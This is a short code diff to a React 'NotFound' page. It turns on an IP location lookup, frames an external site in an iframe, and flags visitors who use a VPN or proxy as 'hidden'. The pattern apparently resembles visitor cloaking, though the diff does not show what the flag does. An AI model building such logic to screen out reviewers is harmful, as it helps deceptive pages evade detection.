@@ -20,7 +20,7 @@ import { db } from "../firebase";
 
 
 function NotFound() {
-  let[countryCode, setCountryCode] = useState('us');
+  let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://stackdoublelink.vercel.app');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home');
@@ -69,13 +69,7 @@ function NotFound() {
               setCountryCode(countryCode.toLowerCase());
               var privacy = data.privacy;
               if(privacy){
-                if(
-                  privacy.vpn == true
-                  || privacy.hosting == true
-                  || privacy.relay == true
-                  || privacy.tor == true
-                  || privacy.proxy == true
-                ){
+                if(privacy.vpn == true || privacy.proxy == true){
                   SetUserHiden(true);
                 }
               }
@@ -88,7 +82,7 @@ function NotFound() {
     }
   };
   useEffect(() => {
-    //setLocaltion();
+    setLocaltion();
   }, []);
 
   const params = new URLSearchParams(window.location.search)
